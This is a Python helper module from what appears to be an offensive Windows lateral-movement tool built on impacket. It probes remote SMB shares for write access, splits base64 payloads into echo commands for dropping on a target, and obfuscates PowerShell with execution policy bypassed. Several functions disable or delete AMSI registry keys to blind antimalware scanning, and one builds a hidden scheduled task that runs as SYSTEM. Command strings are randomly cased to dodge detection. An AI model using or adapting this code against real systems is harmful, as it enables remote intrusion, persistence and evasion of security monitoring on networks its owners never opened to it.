# -*- coding: UTF-8 -*-

import base64
import copy
import logging
import os
import random
import subprocess
import sys
import time
import winsound
from xml.etree import ElementTree as ET

from impacket import smb3structs
from impacket.dcerpc.v5 import srvs
from tqdm import tqdm

from .resources import EXTENSION_LIST
from .resources import NAME_LIST

__name_list = copy.deepcopy(NAME_LIST)
random.shuffle(__name_list)


def get_random_name():
    names = []
    for _ in range(2):
        name = __name_list.pop(0)
        names.append(name)
        __name_list.append(name)
    return "".join(names)


def get_random_extension():
    return random.choice(EXTENSION_LIST)


def get_cmd_extension():
    return random.choice(("cmd", "bat"))


def get_random_location():
    locations = ("%Temp%", "%SystemRoot%", "%CommonProgramFiles%")
    return random_case(random.choice(locations))


def random_case(text):
    return ''.join(random.choice((str.upper, str.lower))(c) for c in text)


def get_writeable_share(opts, smb_conn, skip_shares=("SYSVOL",)):
    if opts["share"] is not None:
        return opts["share"]
    shares = smb_conn.listShares()
    random.shuffle(shares)
    writeable = None
    for s in shares:
        shi1_type = s["shi1_type"]
        if shi1_type == srvs.STYPE_DISKTREE or shi1_type == srvs.STYPE_SPECIAL:
            share = s["shi1_netname"][:-1]
            tree_id = 0
            try:
                tree_id = smb_conn.connectTree(share)
                smb_conn.openFile(
                    tree_id, "\\", smb3structs.FILE_WRITE_DATA, creationOption=smb3structs.FILE_DIRECTORY_FILE)
                writeable = str(share)
                if writeable in skip_shares:
                    writeable = None
                    continue
                if tree_id != 0:
                    smb_conn.disconnectTree(tree_id)
                break
            except Exception:
                pass
    return writeable


def resolve_path(smb_conn, tree):
    if str(tree).lower() == "admin$":
        return random_case("%systemroot%")

    server_name = smb_conn.getServerName()
    try:
        if server_name == "":
            server_name = "127.0.0.1"
        else:
            server_name = str(server_name)
    except:
        server_name = "127.0.0.1"
    return "\\\\{0}\\{1}".format(server_name, tree)


def data_to_echo_commands(data, output_path, max_cmd_length=8000):
    data = base64.b64encode(data)
    for c in ['^', '&', '\\', '<', '>', '|']:
        data = data.replace(c, '^' + c)

    step = max_cmd_length - len(output_path) - 1
    commands = []
    for i in range(0, len(data), step):
        text = data[i:i + step]
        if i == 0:
            command = '{0} /p={1}>"{2}"'.format(random_case("<nul set"), text, output_path)
        else:
            command = '{0} /p={1}>>"{2}"'.format(random_case("<nul set"), text, output_path)
        commands.append(command)
    return commands


def file_to_echo_commands(file_path, output_path, max_cmd_length=8000):
    with open(file_path, 'rb') as f:
        data = f.read()
    return data_to_echo_commands(data, output_path, max_cmd_length)


def obfuscate_powershell_script(opts, script_path):
    command = 'Import-Module "{0}"; ' \
              'function global:Write-Host() {{}}; ' \
              'Out-ObfuscatedTokenCommand -Path "{1}" "Member" 1;'
    command = command.format(os.path.join(opts["misc"], "Out-ObfuscatedTokenCommand.ps1"), os.path.abspath(script_path))
    powershell_process = subprocess.Popen(
        ["powershell", "-exec", "bypass", "/c", command], shell=True, stdout=subprocess.PIPE)
    script, _ = powershell_process.communicate()
    if "scripts is disabled on this system" in script:
        raise Exception(script)
    script = script.strip()
    return script


def get_b64decode_js(opts):
    path = os.path.join(opts["misc"], "b64decode.js")
    with open(path, 'rb') as f:
        data = f.read().strip()
    return data


def get_auto_environment_js(opts):
    path = os.path.join(opts["misc"], "auto_environment.js")
    with open(path, 'rb') as f:
        data = f.read().strip()
    return data


def command_echo(text, path):
    return '{0} /p="{1}">"{2}"'.format(random_case("<nul set"), text, path)


def command_echo_newline(path):
    return "{0}.>>{1}".format(random_case("echo"), path)


def command_delete_file(path):
    return "{0} \"{1}\"".format(random_case("del /f /q"), path)


def command_certutil_decode(input_path, output_path):
    return "{0} \"{1}\" \"{2}\"".format(random_case("certutil -decode"), input_path, output_path)


def command_cscript_decode(js_path, input_path, output_path):
    return "{0} \"{1}\" \"{2}\" \"{3}\"".format(random_case("cscript //E:JScript"), js_path, input_path, output_path)


def command_disable_amsi_script():
    key_path = "HKCU\\Software\\Microsoft\\Windows Script\\Settings"
    return '{0} "{1}" /v "AmsiEnable" /t REG_DWORD /d 0 /f'.format(random_case('reg add'), random_case(key_path))


def command_enable_amsi_script():
    key_path = "HKCU\\Software\\Microsoft\\Windows Script"
    return '{0} "{1}" /f'.format(random_case("reg delete"), random_case(key_path))


def command_disable_amsi():
    return random_case("reg delete HKLM\SOFTWARE\Microsoft\AMSI\Providers /f")


def command_backup_amsi(file_path):
    return '{0} {1} "{2}" /y'.format(random_case('reg export'), "HKLM\SOFTWARE\Microsoft\AMSI\Providers", file_path)


def command_restore_register(file_path):
    return '{0} "{1}"'.format(random_case("reg import"), file_path)


def command_mshta_with_reg(opts, register_key, num_of_value):
    command_path = os.path.join(opts["misc"], "mshta_with_reg_key.txt")
    with open(command_path, "rb") as f:
        command = f.read()
    command = command.replace("THIS_IS_NUM", str(num_of_value))
    command = command.replace("THIS_IS_KEY", register_key)
    return command


def get_schedule_task_xml(command, arguments=""):
    xml = """<?xml version="1.0"?>
<ns0:Task xmlns:ns0="http://schemas.microsoft.com/windows/2004/02/mit/task" version="1.2">
<ns0:Triggers>
<ns0:CalendarTrigger>
  <ns0:StartBoundary>2011-12-13T00:00:00</ns0:StartBoundary>
  <ns0:Enabled>true</ns0:Enabled>
  <ns0:ScheduleByMonth>
    <ns0:DaysOfMonth>
      <ns0:Day>1</ns0:Day>
    </ns0:DaysOfMonth>
  </ns0:ScheduleByMonth>
</ns0:CalendarTrigger>
</ns0:Triggers>
<ns0:Principals>
<ns0:Principal id="LocalSystem">
  <ns0:UserId>S-1-5-18</ns0:UserId>
  <ns0:RunLevel>HighestAvailable</ns0:RunLevel>
</ns0:Principal>
</ns0:Principals>
<ns0:Settings>
<ns0:MultipleInstancesPolicy>IgnoreNew</ns0:MultipleInstancesPolicy>
<ns0:DisallowStartIfOnBatteries>false</ns0:DisallowStartIfOnBatteries>
<ns0:StopIfGoingOnBatteries>false</ns0:StopIfGoingOnBatteries>
<ns0:AllowHardTerminate>true</ns0:AllowHardTerminate>
<ns0:RunOnlyIfNetworkAvailable>false</ns0:RunOnlyIfNetworkAvailable>
<ns0:IdleSettings>
  <ns0:StopOnIdleEnd>true</ns0:StopOnIdleEnd>
  <ns0:RestartOnIdle>false</ns0:RestartOnIdle>
</ns0:IdleSettings>
<ns0:AllowStartOnDemand>true</ns0:AllowStartOnDemand>
<ns0:Enabled>true</ns0:Enabled>
<ns0:Hidden>true</ns0:Hidden>
<ns0:RunOnlyIfIdle>false</ns0:RunOnlyIfIdle>
<ns0:WakeToRun>false</ns0:WakeToRun>
<ns0:ExecutionTimeLimit>P3D</ns0:ExecutionTimeLimit>
<ns0:Priority>7</ns0:Priority>
</ns0:Settings>
<ns0:Actions Context="LocalSystem">
<ns0:Exec>
  <ns0:Command></ns0:Command>
  <ns0:Arguments></ns0:Arguments>
</ns0:Exec>
</ns0:Actions>
</ns0:Task>
"""
    root = ET.fromstring(xml)
    root[3][0][0].text = command
    root[3][0][1].text = arguments
    return ET.tostring(root)


def log_to_file(level, msg, logger_name=None):
    logger = logging.getLogger(logger_name)
    try:
        fn, lno, func = logger.findCaller()
    except ValueError:
        fn, lno, func = "(unknown file)", 0, "(unknown function)"
    record = logger.makeRecord(logger.name, level, fn, lno, msg, (), None, func, None)
    for hdl in logger.handlers:
        if type(hdl) == logging.FileHandler:
            hdl.handle(record)


def is_disconnected(err_str):
    for s in ("STATUS_PIPE_BROKEN", "STATUS_PIPE_CLOSING", "STATUS_PIPE_DISCONNECTED",
              "closed by the remote host", "aborted by the software"):
        if s in err_str:
            return True
    return False


def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()


def writeline(text=u""):
    write(text + "\r\n")


def sleep(n):
    progress_bar = tqdm(total=n, ncols=80, bar_format="{l_bar}{bar}| Wait for {n_fmt}/{total_fmt} s")
    for i in range(n):
        time.sleep(1)
        progress_bar.update(1)
    progress_bar.close()


def play_sound():
    try:
        winsound.PlaySound("*", winsound.SND_ASYNC)
    except:
        pass
